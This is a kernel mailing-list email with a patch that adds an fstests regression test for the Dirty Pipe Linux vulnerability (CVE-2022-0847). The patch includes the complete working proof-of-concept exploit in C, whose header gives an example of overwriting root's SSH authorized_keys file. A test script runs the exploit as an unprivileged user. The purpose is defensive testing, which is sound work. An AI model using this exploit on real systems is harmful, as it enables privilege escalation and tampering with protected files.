Return-Path: <fstests-owner@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 9B4FAC433F5
	for <linux-fstests@archiver.kernel.org>; Tue,  8 Mar 2022 09:23:03 +0000 (UTC)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S236177AbiCHJX5 (ORCPT
        <rfc822;linux-fstests@archiver.kernel.org>);
        Tue, 8 Mar 2022 04:23:57 -0500
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:50878 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S234844AbiCHJX5 (ORCPT
        <rfc822;fstests@vger.kernel.org>); Tue, 8 Mar 2022 04:23:57 -0500
Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.133.124])
        by lindbergh.monkeyblade.net (Postfix) with ESMTP id A6A232DAAF
        for <fstests@vger.kernel.org>; Tue,  8 Mar 2022 01:22:58 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
        s=mimecast20190719; t=1646731377;
        h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
         to:to:cc:cc:mime-version:mime-version:
         content-transfer-encoding:content-transfer-encoding;
        bh=R18qLmHZuQrqp6sRaln8ZEBajNLmhlcBe8v7Zu8uBM4=;
        b=dxiTK4oWiv8nusAEuRJ2Fw79HLf3AM1zRxPV7y0rFvfZYujps1NomdTx/LncohekHNQR4o
        WsmnjfARIw69DbV5dmqW2qzQcNAGWoa+5ketVZm/k9FaBCG4IwRJOKgjbnsRnzqFvFQRNG
        SSetWQneKiYwsV69tvFKc9dAv3C6bgw=
Received: from mimecast-mx01.redhat.com (mimecast-mx01.redhat.com
 [209.132.183.4]) by relay.mimecast.com with ESMTP with STARTTLS
 (version=TLSv1.2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 us-mta-374-JS2_rMKKMguNhH72KEygRQ-1; Tue, 08 Mar 2022 04:22:54 -0500
X-MC-Unique: JS2_rMKKMguNhH72KEygRQ-1
Received: from smtp.corp.redhat.com (int-mx06.intmail.prod.int.phx2.redhat.com [10.5.11.16])
        (using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
        (No client certificate requested)
        by mimecast-mx01.redhat.com (Postfix) with ESMTPS id A6BF11091DA1;
        Tue,  8 Mar 2022 09:22:53 +0000 (UTC)
Received: from zlang-laptop.redhat.com (ovpn-12-89.pek2.redhat.com [10.72.12.89])
        by smtp.corp.redhat.com (Postfix) with ESMTP id 76B927AB76;
        Tue,  8 Mar 2022 09:22:51 +0000 (UTC)
From:   Zorro Lang <zlang@redhat.com>
To:     fstests@vger.kernel.org
Cc:     max.kellermann@ionos.com
Subject: [PATCH] fstests: test dirty pipe vulnerability issue of CVE-2022-0847
Date:   Tue,  8 Mar 2022 17:22:48 +0800
Message-Id: <20220308092248.786739-1-zlang@redhat.com>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-Scanned-By: MIMEDefang 2.79 on 10.5.11.16
Precedence: bulk
List-ID: <fstests.vger.kernel.org>
X-Mailing-List: fstests@vger.kernel.org

Test for the Dirty Pipe vulnerability (CVE-2022-0847) caused by an
uninitialized  "pipe_buffer.flags" variable. The bug cause a file
can be overwritten even if a user/process is not permitted to write
it. It's fixed by 9d2231c5d74e ("lib/iov_iter: initialize "flags" in
new pipe_buffer").

Cc: Max Kellermann <max.kellermann@ionos.com>
Signed-off-by: Zorro Lang <zlang@redhat.com>
---

Hi,

As the CVE-2022-0847 "Dirty Pipe Vulnerability" is public now, to cover this
bug testing, I write this case to fstests.
The main test program comes from Max Kellermann(https://dirtypipe.cm4all.com/),
I just changed it a little bit, then help it run with xfstests frame.

Please help to review, and feel free to tell me if it's not good to be in fstests.

Thanks,
Zorro

 .gitignore            |   1 +
 src/Makefile          |   2 +-
 src/splice2pipe.c     | 155 ++++++++++++++++++++++++++++++++++++++++++
 tests/generic/676     |  47 +++++++++++++
 tests/generic/676.out |   9 +++
 5 files changed, 213 insertions(+), 1 deletion(-)
 create mode 100644 src/splice2pipe.c
 create mode 100755 tests/generic/676
 create mode 100644 tests/generic/676.out

diff --git a/.gitignore b/.gitignore
index ba0c572b..a05c6058 100644
--- a/.gitignore
+++ b/.gitignore
@@ -125,6 +125,7 @@ tags
 /src/runas
 /src/seek_copy_test
 /src/seek_sanity_test
+/src/splice2pipe
 /src/splice-test
 /src/stale_handle
 /src/stat_test
diff --git a/src/Makefile b/src/Makefile
index 111ce1d9..7725c4aa 100644
--- a/src/Makefile
+++ b/src/Makefile
@@ -31,7 +31,7 @@ LINUX_TARGETS = xfsctl bstat t_mtab getdevicesize preallo_rw_pattern_reader \
 	dio-invalidate-cache stat_test t_encrypted_d_revalidate \
 	attr_replace_test swapon mkswap t_attr_corruption t_open_tmpfiles \
 	fscrypt-crypt-util bulkstat_null_ocount splice-test chprojid_fail \
-	detached_mounts_propagation ext4_resize
+	detached_mounts_propagation ext4_resize splice2pipe
 
 EXTRA_EXECS = dmerror fill2attr fill2fs fill2fs_check scaleread.sh \
 	      btrfs_crc32c_forged_name.py
diff --git a/src/splice2pipe.c b/src/splice2pipe.c
new file mode 100644
index 00000000..88b58f7e
--- /dev/null
+++ b/src/splice2pipe.c
@@ -0,0 +1,155 @@
+/* SPDX-License-Identifier: GPL-2.0 */
+/*
+ * Copyright 2022 CM4all GmbH / IONOS SE
+ *
+ * author: Max Kellermann <max.kellermann@ionos.com>
+ *
+ * Proof-of-concept exploit for the Dirty Pipe
+ * vulnerability (CVE-2022-0847) caused by an uninitialized
+ * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
+ * file contents in the page cache, even if the file is not permitted
+ * to be written, immutable or on a read-only mount.
+ *
+ * This exploit requires Linux 5.8 or later; the code path was made
+ * reachable by commit f6dd975583bd ("pipe: merge
+ * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
+ * there before, it just provided an easy way to exploit it.
+ *
+ * There are two major limitations of this exploit: the offset cannot
+ * be on a page boundary (it needs to write one byte before the offset
+ * to add a reference to this page to the pipe), and the write cannot
+ * cross a page boundary.
+ *
+ * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
+ *
+ * Further explanation: https://dirtypipe.cm4all.com/
+ */
+#ifndef _GNU_SOURCE
+#define _GNU_SOURCE
+#endif
+#include <unistd.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/user.h>
+
+/**
+ * Create a pipe where all "bufs" on the pipe_inode_info ring have the
+ * PIPE_BUF_FLAG_CAN_MERGE flag set.
+ */
+static void prepare_pipe(int p[2])
+{
+	if (pipe(p)) abort();
+
+	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
+	static char buffer[4096];
+
+	/* fill the pipe completely; each pipe_buffer will now have
+	   the PIPE_BUF_FLAG_CAN_MERGE flag */
+	for (unsigned r = pipe_size; r > 0;) {
+		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
+		write(p[1], buffer, n);
+		r -= n;
+	}
+
+	/* drain the pipe, freeing all pipe_buffer instances (but
+	   leaving the flags initialized) */
+	for (unsigned r = pipe_size; r > 0;) {
+		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
+		read(p[0], buffer, n);
+		r -= n;
+	}
+
+	/* the pipe is now empty, and if somebody adds a new
+	   pipe_buffer without initializing its "flags", the buffer
+	   will be mergeable */
+}
+
+int main(int argc, char **argv)
+{
+	if (argc != 4) {
+		fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA\n", argv[0]);
+		return EXIT_FAILURE;
+	}
+
+	/* dumb command-line argument parser */
+	const char *const path = argv[1];
+	loff_t offset = strtoul(argv[2], NULL, 0);
+	const char *const data = argv[3];
+	const size_t data_size = strlen(data);
+	int page_size = sysconf(_SC_PAGESIZE);
+	if (page_size == -1)
+		page_size = 4096;
+
+	if (offset % page_size == 0) {
+		fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
+		return EXIT_FAILURE;
+	}
+
+	const loff_t next_page = (offset | (page_size - 1)) + 1;
+	const loff_t end_offset = offset + (loff_t)data_size;
+	if (end_offset > next_page) {
+		fprintf(stderr, "Sorry, cannot write across a page boundary\n");
+		return EXIT_FAILURE;
+	}
+
+	/* open the input file and validate the specified offset */
+	const int fd = open(path, O_RDONLY); // yes, read-only! :-)
+	if (fd < 0) {
+		perror("open failed");
+		return EXIT_FAILURE;
+	}
+
+	struct stat st;
+	if (fstat(fd, &st)) {
+		perror("stat failed");
+		return EXIT_FAILURE;
+	}
+
+	if (offset > st.st_size) {
+		fprintf(stderr, "Offset is not inside the file\n");
+		return EXIT_FAILURE;
+	}
+
+	if (end_offset > st.st_size) {
+		fprintf(stderr, "Sorry, cannot enlarge the file\n");
+		return EXIT_FAILURE;
+	}
+
+	/* create the pipe with all flags initialized with
+	   PIPE_BUF_FLAG_CAN_MERGE */
+	int p[2];
+	prepare_pipe(p);
+
+	/* splice one byte from before the specified offset into the
+	   pipe; this will add a reference to the page cache, but
+	   since copy_page_to_iter_pipe() does not initialize the
+	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
+	--offset;
+	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
+	if (nbytes < 0) {
+		perror("splice failed");
+		return EXIT_FAILURE;
+	}
+	if (nbytes == 0) {
+		fprintf(stderr, "short splice\n");
+		return EXIT_FAILURE;
+	}
+
+	/* the following write will not create a new pipe_buffer, but
+	   will instead write into the page cache, because of the
+	   PIPE_BUF_FLAG_CAN_MERGE flag */
+	nbytes = write(p[1], data, data_size);
+	if (nbytes < 0) {
+		perror("write failed");
+		return EXIT_FAILURE;
+	}
+	if ((size_t)nbytes < data_size) {
+		fprintf(stderr, "short write\n");
+		return EXIT_FAILURE;
+	}
+
+	return EXIT_SUCCESS;
+}
diff --git a/tests/generic/676 b/tests/generic/676
new file mode 100755
index 00000000..6092aac3
--- /dev/null
+++ b/tests/generic/676
@@ -0,0 +1,47 @@
+#! /bin/bash
+# SPDX-License-Identifier: GPL-2.0
+# Copyright (c) 2022 Red Hat, Inc.  All Rights Reserved.
+#
+# FS QA Test 676
+#
+# Test for the Dirty Pipe vulnerability (CVE-2022-0847) caused by an
+# uninitialized  "pipe_buffer.flags" variable, which fixed by:
+#   9d2231c5d74e ("lib/iov_iter: initialize "flags" in new pipe_buffer")
+#
+. ./common/preamble
+_begin_fstest auto quick
+
+# real QA test starts here
+_supported_fs generic
+_require_test
+_require_user
+_require_chmod
+_require_test_program "splice2pipe"
+
+localfile=$TEST_DIR/testfile.$seq
+
+# Create a file with 4k 0xff data, then make sure unprivileged user has readonly
+# permission on it
+$XFS_IO_PROG -f -t -c "pwrite 0 4k -S 0xff" $localfile >> $seqres.full 2>&1
+chmod 0644 $localfile
+# Test privileged user (xfstests generally run with root)
+echo "Test privileged user:"
+$here/src/splice2pipe $localfile 1 "AAAAAAAABBBBBBBB"
+# Part of 0xff will be overwritten if there's CVE-2022-0847 bug
+hexdump -C $localfile
+
+# Create a file with 4k 0xff data, then make sure unprivileged user has readonly
+# permission on it
+$XFS_IO_PROG -f -t -c "pwrite 0 4k -S 0xff" $localfile >> $seqres.full 2>&1
+chmod 0644 $localfile
+# Copy splice2pipe to a place which can be run by an unprivileged user (avoid
+# something likes /root/xfstests/src/splice2pipe)
+cp $here/src/splice2pipe $tmp.splice2pipe
+# Test unprivileged user's privilege escalation
+echo "Test unprivileged user:"
+su ${qa_user} -c "$tmp.splice2pipe $localfile 1 AAAAAAAABBBBBBBB"
+hexdump -C $localfile
+
+# success, all done
+status=0
+exit
diff --git a/tests/generic/676.out b/tests/generic/676.out
new file mode 100644
index 00000000..f006e659
--- /dev/null
+++ b/tests/generic/676.out
@@ -0,0 +1,9 @@
+QA output created by 676
+Test privileged user:
+00000000  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
+*
+00001000
+Test unprivileged user:
+00000000  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
+*
+00001000
-- 
2.31.1

